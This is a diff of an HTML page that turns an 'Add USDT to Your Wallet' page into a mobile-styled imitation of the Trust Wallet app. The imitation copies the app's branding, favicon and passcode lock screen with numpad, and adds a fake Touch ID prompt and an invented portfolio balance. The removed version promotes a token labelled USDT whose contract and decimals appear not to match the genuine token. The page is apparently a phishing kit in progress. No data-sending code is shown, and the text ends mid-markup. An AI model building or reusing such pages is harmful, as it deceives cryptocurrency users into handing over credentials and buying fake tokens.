@@ -2,1007 +2,978 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Add USDT to Your Wallet</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Trust Wallet</title>
+    <link rel="icon" href="https://trustwallet.com/assets/images/favicon.png" type="image/png">
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-color: #26a17b;
-            --primary-dark: #1a8a6a;
-            --text-color: #333;
-            --text-secondary: #666;
-            --background-color: #f8f9fa;
-            --card-background: #fff;
-            --border-color: #e9ecef;
-            --success-color: #28a745;
-            --warning-color: #ffc107;
-            --error-color: #dc3545;
+            --primary-color: #3375BB;
+            --primary-dark: #2B68A6;
+            --bg-color: #F5F7F8;
+            --card-bg: #FFFFFF;
+            --text-primary: #1A2024;
+            --text-secondary: #5F6C78;
+            --text-tertiary: #889099;
+            --border-color: #E8EBED;
+            --success-color: #05944F;
+            --error-color: #E52E2E;
+            --warning-color: #FF9500;
         }
         
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            -webkit-tap-highlight-color: transparent;
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: var(--background-color);
-            color: var(--text-color);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            line-height: 1.5;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            overflow: hidden;
+            user-select: none;
+        }
+        
+        button {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            cursor: pointer;
+        }
+        
+        /* Lock Screen Styles */
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--primary-color);
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
-            line-height: 1.6;
-        }
-        
-        .container {
-            max-width: 520px;
-            margin: 0 auto;
-            padding: 24px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-        
-        header h1 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--primary-color);
-        }
-        
-        header p {
-            color: var(--text-secondary);
-            font-size: 16px;
-        }
-        
-        .token-card {
-            background: var(--card-background);
-            border-radius: 16px;
-            padding: 28px;
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
-            margin-bottom: 24px;
-            flex-grow: 1;
-            border: 1px solid var(--border-color);
-        }
-        
-        .token-header {
-            display: flex;
             align-items: center;
-            margin-bottom: 24px;
-            justify-content: space-between;
+            padding-top: 80px;
+            z-index: 1000;
         }
         
-        .token-logo-container {
-            display: flex;
-            align-items: center;
+        .lock-logo {
+            width: 90px;
+            height: 90px;
+            margin-bottom: 32px;
         }
         
-        .token-logo {
-            width: 54px;
-            height: 54px;
-            border-radius: 50%;
-            margin-right: 18px;
-            padding: 4px;
-            border: 2px solid var(--primary-color);
-            background-color: white;
-        }
-        
-        .token-title h2 {
-            margin: 0;
+        .lock-title {
+            color: white;
             font-size: 22px;
             font-weight: 600;
-            color: var(--text-color);
-        }
-        
-        .token-title p {
-            margin: 4px 0 0;
-            font-size: 15px;
-            color: var(--text-secondary);
-        }
-        
-        .network-badge {
-            display: flex;
-            align-items: center;
-            padding: 6px 12px;
-            background-color: #f9e9e9;
-            color: #c12037;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .network-badge img {
-            height: 18px;
-            margin-right: 6px;
-        }
-        
-        .token-details {
-            margin-bottom: 28px;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            overflow: hidden;
-        }
-        
-        .detail-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 14px 16px;
-            border-bottom: 1px solid var(--border-color);
-            background-color: #fdfdfd;
-        }
-        
-        .detail-row:last-child {
-            border-bottom: none;
-        }
-        
-        .detail-label {
-            color: var(--text-secondary);
-            font-size: 15px;
-            font-weight: 500;
-        }
-        
-        .detail-value {
-            font-weight: 500;
-            font-size: 15px;
-            text-align: right;
-            color: var(--text-color);
-            word-break: break-all;
-            max-width: 240px;
-        }
-        
-        .contract-value {
-            display: flex;
-            align-items: center;
-        }
-        
-        .copy-btn {
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: var(--primary-color);
-            margin-left: 8px;
-            font-size: 14px;
-        }
-        
-        .btn {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             margin-bottom: 16px;
         }
         
-        .btn:hover {
-            background-color: var(--primary-dark);
+        .lock-subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 17px;
+            margin-bottom: 48px;
+            font-weight: 400;
         }
         
-        .btn:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-        
-        .btn-secondary {
-            background-color: #f8f9fa;
-            color: var(--text-color);
-            border: 1px solid var(--border-color);
-        }
-        
-        .btn-secondary:hover {
-            background-color: #e9ecef;
-        }
-        
-        .btn-icon {
-            margin-right: 8px;
-        }
-        
-        .status-container {
-            margin-top: 20px;
-        }
-        
-        .status-step {
+        .passcode-dots {
             display: flex;
-            align-items: center;
-            margin-bottom: 12px;
-            padding: 10px;
-            border-radius: 8px;
-            background-color: #f8f9fa;
+            margin-bottom: 40px;
         }
         
-        .status-step.active {
-            background-color: #e6f7ff;
-            border-left: 4px solid #1890ff;
-        }
-        
-        .status-step.success {
-            background-color: #f6ffed;
-            border-left: 4px solid #52c41a;
-        }
-        
-        .status-step.error {
-            background-color: #fff2f0;
-            border-left: 4px solid #ff4d4f;
-        }
-        
-        .step-icon {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            background-color: #eee;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 12px;
-            flex-shrink: 0;
-        }
-        
-        .step-icon.success {
-            background-color: #52c41a;
-            color: white;
-        }
-        
-        .step-icon.error {
-            background-color: #ff4d4f;
-            color: white;
-        }
-        
-        .step-icon.active {
-            background-color: #1890ff;
-            color: white;
-        }
-        
-        .step-content {
-            flex-grow: 1;
-        }
-        
-        .step-title {
-            font-weight: 500;
-            margin-bottom: 2px;
-        }
-        
-        .step-description {
-            font-size: 14px;
-            color: var(--text-secondary);
-        }
-        
-        .success-message {
-            background-color: #f6ffed;
-            border: 1px solid #b7eb8f;
-            color: #52c41a;
-            padding: 16px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-            display: none;
-        }
-        
-        .success-icon {
-            font-size: 24px;
-            margin-right: 12px;
-        }
-        
-        .error-message {
-            background-color: #fff2f0;
-            border: 1px solid #ffccc7;
-            color: #ff4d4f;
-            padding: 16px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-            display: none;
-        }
-        
-        .error-icon {
-            font-size: 24px;
-            margin-right: 12px;
-        }
-        
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--primary-color);
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .steps-section {
-            margin-top: 40px;
-            border-top: 1px solid var(--border-color);
-            padding-top: 24px;
-        }
-        
-        .steps-heading {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 16px;
-            color: var(--text-color);
-        }
-        
-        .verification-section {
-            margin-top: 30px;
-            display: none;
-        }
-        
-        .verification-box {
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 20px;
-            background-color: #f8f9fa;
-        }
-        
-        .verification-title {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: var(--text-color);
-        }
-        
-        .verification-buttons {
-            display: flex;
-            gap: 12px;
-        }
-        
-        .verification-btn {
-            flex: 1;
-            padding: 10px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            background-color: white;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .verification-btn:hover {
-            background-color: #f0f7f4;
-            border-color: var(--primary-color);
-        }
-        
-        .verification-btn.yes {
-            border-color: #52c41a;
-        }
-        
-        .verification-btn.no {
-            border-color: #ff4d4f;
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: auto;
-            padding: 24px 16px;
-            color: var(--text-secondary);
-            font-size: 14px;
-            border-top: 1px solid var(--border-color);
-        }
-        
-        .tooltip {
-            position: relative;
-            display: inline-block;
-            cursor: help;
-            margin-left: 4px;
-        }
-        
-        .tooltip-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
+        .passcode-dot {
             width: 16px;
             height: 16px;
             border-radius: 50%;
-            background-color: #e9ecef;
-            color: #666;
-            font-size: 12px;
-            font-weight: bold;
+            background-color: rgba(255, 255, 255, 0.3);
+            margin: 0 6px;
         }
         
-        .tooltip-text {
-            visibility: hidden;
-            width: 220px;
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
-            padding: 8px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-            transition: opacity 0.3s;
-            font-size: 12px;
-            font-weight: normal;
+        .passcode-dot.filled {
+            background-color: white;
         }
         
-        .tooltip:hover .tooltip-text {
-            visibility: visible;
-            opacity: 1;
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 80px);
+            grid-template-rows: repeat(4, 80px);
+            gap: 14px;
+            margin-top: 12px;
         }
         
-        .troubleshooting-section {
-            margin-top: 40px;
-            border-top: 1px solid var(--border-color);
-            padding-top: 24px;
+        .numpad-btn {
+            background-color: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            font-size: 28px;
+            color: white;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .numpad-btn:active {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .numpad-btn.empty {
+            background-color: transparent;
+        }
+        
+        .biometric-btn {
+            background-color: transparent;
+            border: none;
+            color: white;
+            font-size: 22px;
+            margin-top: 16px;
+        }
+        
+        /* Main Wallet Styles */
+        .wallet-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            z-index: 100;
             display: none;
         }
         
-        .troubleshooting-heading {
+        .wallet-header {
+            background-color: var(--card-bg);
+            padding: 20px 16px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .wallet-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .wallet-actions {
+            display: flex;
+        }
+        
+        .action-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--bg-color);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 8px;
+        }
+        
+        .portfolio-card {
+            background-color: var(--card-bg);
+            margin: 16px;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+        }
+        
+        .portfolio-value {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        
+        .portfolio-change {
+            display: flex;
+            align-items: center;
+            color: var(--success-color);
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .network-tabs {
+            display: flex;
+            padding: 0 16px;
+            margin-bottom: 8px;
+        }
+        
+        .network-tab {
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-right: 8px;
+        }
+        
+        .network-tab.active {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .tokens-list {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 80px;
+        }
+        
+        .token-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            background-color: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .token-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 16px;
+            background-color: var(--bg-color);
+            object-fit: cover;
+        }
+        
+        .token-details {
+            flex: 1;
+        }
+        
+        .token-name {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .token-balance {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        
+        .token-value {
+            text-align: right;
+        }
+        
+        .token-price {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .token-percent {
+            font-size: 14px;
+            color: var(--success-color);
+        }
+        
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            background-color: var(--card-bg);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-top: 1px solid var(--border-color);
+            padding-bottom: env(safe-area-inset-bottom, 0);
+        }
+        
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 8px 16px;
+        }
+        
+        .nav-icon {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 4px;
+        }
+        
+        .nav-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+        
+        .nav-item.active .nav-label {
+            color: var(--primary-color);
+            font-weight: 500;
+        }
+        
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--primary-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+        
+        .loading-logo {
+            width: 90px;
+            height: 90px;
+            margin-bottom: 32px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Token Detail Screen */
+        .token-detail {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--bg-color);
+            z-index: 200;
+            display: none;
+            flex-direction: column;
+        }
+        
+        .detail-header {
+            background-color: var(--card-bg);
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .back-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: var(--bg-color);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+        }
+        
+        .detail-token-info {
+            display: flex;
+            align-items: center;
+        }
+        
+        .detail-token-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            margin-right: 12px;
+        }
+        
+        .detail-token-name {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .detail-price-section {
+            background-color: var(--card-bg);
+            padding: 24px 16px;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .detail-price {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .detail-change {
+            display: inline-flex;
+            align-items: center;
+            background-color: rgba(5, 148, 79, 0.1);
+            color: var(--success-color);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .detail-chart {
+            height: 200px;
+            margin: 16px;
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 16px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .chart-placeholder {
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(90deg, 
+                rgba(51, 117, 187, 0.1) 0%, 
+                rgba(51, 117, 187, 0.3) 50%, 
+                rgba(51, 117, 187, 0.1) 100%);
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .chart-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg width='300' height='100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0,50 C50,30 100,70 150,40 C200,10 250,60 300,50' stroke='%233375BB' stroke-width='2' fill='none' /%3E%3C/svg%3E");
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+        }
+        
+        .detail-actions {
+            display: flex;
+            padding: 16px;
+            gap: 12px;
+        }
+        
+        .detail-action-btn {
+            flex: 1;
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .send-btn {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .receive-btn {
+            background-color: var(--bg-color);
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+        }
+        
+        .detail-info {
+            background-color: var(--card-bg);
+            margin: 16px;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .info-label {
+            color: var(--text-secondary);
+            font-size: 15px;
+        }
+        
+        .info-value {
+            font-size: 15px;
+            font-weight: 500;
+            max-width: 180px;
+            text-align: right;
+            word-break: break-all;
+        }
+        
+        /* Status Bar */
+        .status-bar {
+            height: env(safe-area-inset-top, 20px);
+            background-color: var(--primary-color);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 3000;
+        }
+        
+        /* Biometric Popup */
+        .biometric-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5000;
+            display: none;
+        }
+        
+        .biometric-box {
+            background-color: white;
+            border-radius: 16px;
+            width: 80%;
+            max-width: 340px;
+            padding: 24px;
+            text-align: center;
+        }
+        
+        .biometric-title {
             font-size: 18px;
             font-weight: 600;
             margin-bottom: 16px;
-            color: var(--text-color);
         }
         
-        .troubleshooting-tips {
-            margin-bottom: 20px;
+        .fingerprint-icon {
+            width: 64px;
+            height: 64px;
+            margin: 16px auto;
         }
         
-        .tip {
-            margin-bottom: 12px;
-            padding-left: 24px;
-            position: relative;
+        .biometric-message {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
         }
         
-        .tip::before {
-            content: "•";
-            position: absolute;
-            left: 8px;
-            color: var(--primary-color);
-            font-weight: bold;
+        .biometric-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
         }
         
-        /* Mobile optimization */
-        @media (max-width: 576px) {
-            .container {
-                padding: 16px;
-            }
-            
-            .token-card {
-                padding: 20px;
-            }
-            
-            .token-logo {
-                width: 44px;
-                height: 44px;
-                margin-right: 14px;
-            }
-            
-            .token-title h2 {
-                font-size: 20px;
-            }
-            
-            .detail-value {
-                max-width: 190px;
-                font-size: 14px;
-            }
-            
-            .verification-buttons {
-                flex-direction: column;
-            }
+        .cancel-btn {
+            background-color: transparent;
+            border: none;
+            color: var(--text-secondary);
+            margin-top: 16px;
+            font-size: 15px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Add USDT to Your Wallet</h1>
-            <p>Import Tether USD (USDT) with correct logo</p>
-        </header>
+    <!-- Status Bar -->
+    <div class="status-bar"></div>
+    
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet Logo" class="loading-logo">
+        <div class="loading-spinner"></div>
+    </div>
+    
+    <!-- Lock Screen -->
+    <div class="lock-screen" id="lockScreen">
+        <img src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet Logo" class="lock-logo">
+        <div class="lock-title">Enter Passcode</div>
+        <div class="lock-subtitle">Enter your 6-digit passcode</div>
         
-        <div class="success-message" id="successMessage">
-            <span class="success-icon">✓</span>
-            <div>
-                <strong>Success!</strong> USDT token has been added to your wallet.
-            </div>
+        <div class="passcode-dots" id="passcodeDots">
+            <div class="passcode-dot"></div>
+            <div class="passcode-dot"></div>
+            <div class="passcode-dot"></div>
+            <div class="passcode-dot"></div>
+            <div class="passcode-dot"></div>
+            <div class="passcode-dot"></div>
         </div>
         
-        <div class="error-message" id="errorMessage">
-            <span class="error-icon">⚠</span>
-            <div id="errorText">
-                <strong>Error!</strong> Failed to add token. Please try again.
-            </div>
+        <div class="numpad">
+            <button class="numpad-btn" data-value="1">1</button>
+            <button class="numpad-btn" data-value="2">2</button>
+            <button class="numpad-btn" data-value="3">3</button>
+            <button class="numpad-btn" data-value="4">4</button>
+            <button class="numpad-btn" data-value="5">5</button>
+            <button class="numpad-btn" data-value="6">6</button>
+            <button class="numpad-btn" data-value="7">7</button>
+            <button class="numpad-btn" data-value="8">8</button>
+            <button class="numpad-btn" data-value="9">9</button>
+            <button class="numpad-btn empty"></button>
+            <button class="numpad-btn" data-value="0">0</button>
+            <button class="numpad-btn empty"></button>
         </div>
         
-        <div class="token-card" id="tokenCard">
-            <div class="token-header">
-                <div class="token-logo-container">
-                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="token-logo" id="tokenLogo">
-                    <div class="token-title">
-                        <h2>Tether USD</h2>
-                        <p>Stablecoin pegged to USD</p>
-                    </div>
-                </div>
-                <div class="network-badge">
-                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="BSC" id="networkLogo">
-                    <span>BSC</span>
-                </div>
-            </div>
-            
-            <div class="token-details" id="tokenDetails">
-                <div class="detail-row">
-                    <div class="detail-label">Symbol</div>
-                    <div class="detail-value">USDT</div>
-                </div>
-                <div class="detail-row">
-                    <div class="detail-label">Contract Address</div>
-                    <div class="detail-value">
-                        <div class="contract-value">
-                            <span id="contractAddress">0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c</span>
-                            <button class="copy-btn" id="copyBtn">Copy</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="detail-row">
-                    <div class="detail-label">Decimals</div>
-                    <div class="detail-value">6</div>
-                </div>
-                <div class="detail-row">
-                    <div class="detail-label">Network</div>
-                    <div class="detail-value">Binance Smart Chain (BSC)</div>
-                </div>
-            </div>
-            
-            <button id="addTokenBtn" class="btn">
-                <span class="btn-icon">+</span>
-                Add USDT to Wallet with Logo
-            </button>
-            
-            <button id="retryBtn" class="btn btn-secondary" style="display: none;">
-                <span class="btn-icon">↻</span>
-                Try Again with Different Method
-            </button>
-            
-            <div class="status-container" id="statusContainer">
-                <div class="status-step" id="step1">
-                    <div class="step-icon" id="step1Icon">1</div>
-                    <div class="step-content">
-                        <div class="step-title">Connect wallet</div>
-                        <div class="step-description">Connecting to your wallet...</div>
-                    </div>
-                </div>
-                
-                <div class="status-step" id="step2">
-                    <div class="step-icon" id="step2Icon">2</div>
-                    <div class="step-content">
-                        <div class="step-title">Switch to BSC network</div>
-                        <div class="step-description">Checking network...</div>
-                    </div>
-                </div>
-                
-                <div class="status-step" id="step3">
-                    <div class="step-icon" id="step3Icon">3</div>
-                    <div class="step-content">
-                        <div class="step-title">Add USDT token</div>
-                        <div class="step-description">Adding token with logo...</div>
-                    </div>
-                </div>
-                
-                <div class="status-step" id="step4">
-                    <div class="step-icon" id="step4Icon">4</div>
-                    <div class="step-content">
-                        <div class="step-title">Verify token added</div>
-                        <div class="step-description">Checking if token was added successfully...</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="verification-section" id="verificationSection">
-                <div class="verification-box">
-                    <div class="verification-title">Do you see the USDT logo in your wallet?</div>
-                    <div class="verification-buttons">
-                        <button class="verification-btn yes" id="verifyYesBtn">Yes, I can see the logo</button>
-                        <button class="verification-btn no" id="verifyNoBtn">No, logo is missing</button>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="troubleshooting-section" id="troubleshootingSection">
-                <div class="troubleshooting-heading">Troubleshooting Tips</div>
-                <div class="troubleshooting-tips">
-                    <div class="tip">Make sure you're using the latest version of MetaMask</div>
-                    <div class="tip">Try clearing your MetaMask activity data: Settings → Advanced → Clear activity tab data</div>
-                    <div class="tip">Refresh your browser and try again</div>
-                    <div class="tip">Try using a different browser (Chrome works best)</div>
-                    <div class="tip">If on mobile, try using the desktop version</div>
-                </div>
-                <button id="troubleshootRetryBtn" class="btn">
-                    <span class="btn-icon">↻</span>
-                    Try Again
+        <button class="biometric-btn" id="biometricBtn">
+            <span>👆</span> Touch ID
+        </button>
+    </div>
+    
+    <!-- Main Wallet Screen -->
+    <div class="wallet-container" id="walletScreen">
+        <div class="wallet-header">
+            <div class="wallet-title">Wallet</div>
+            <div class="wallet-actions">
+                <button class="action-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M11 19C15.4183 19 19 15.4183 19 11C19 6.58172 15.4183 3 11 3C6.58172 3 3 6.58172 3 11C3 15.4183 6.58172 19 11 19Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M21 21L16.65 16.65" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
                 </button>
+                <button class="action-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M12 16.5V12" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M12 8V7.5" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+                <button class="action-btn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 3L20 7.5V16.5L12 21L4 16.5V7.5L12 3Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <div class="portfolio-card">
+            <div class="portfolio-value" id="portfolioValue">$1,000.00</div>
+            <div class="portfolio-change">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 15L12 9L6 15" stroke="#05944F" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                +2.45%
+            </div>
+        </div>
+        
+        <div class="network-tabs">
+            <div class="network-tab active">All</div>
+            <div class="network-tab">BNB Smart Chain</div>
+            <div class="network-tab">Ethereum</div>
+        </div>
+        
+        <div class="tokens-list" id="tokensList">
+            <!-- Tokens will be added here -->
+        </div>
+        
+        <div class="bottom-nav">
+            <div class="nav-item active">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="#3375BB" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <div class="nav-label">Wallet</div>
+            </div>
+            <div class="nav-item">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M22 12H18L15 21L9 3L6 12H2" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <div class="nav-label">DApps</div>
+            </div>
+            <div class="nav-item">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M2 12H22" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M12 2C14.5013 4.73835 15.9228 8.29203 16 12C15.9228 15.708 14.5013 19.2616 12 22C9.49872 19.2616 8.07725 15.708 8 12C8.07725 8.29203 9.49872 4.73835 12 2V2Z" stroke="#5F6C78" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <div class="nav-label">Discover</div>
+            </div>
+            <div class="nav-item">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
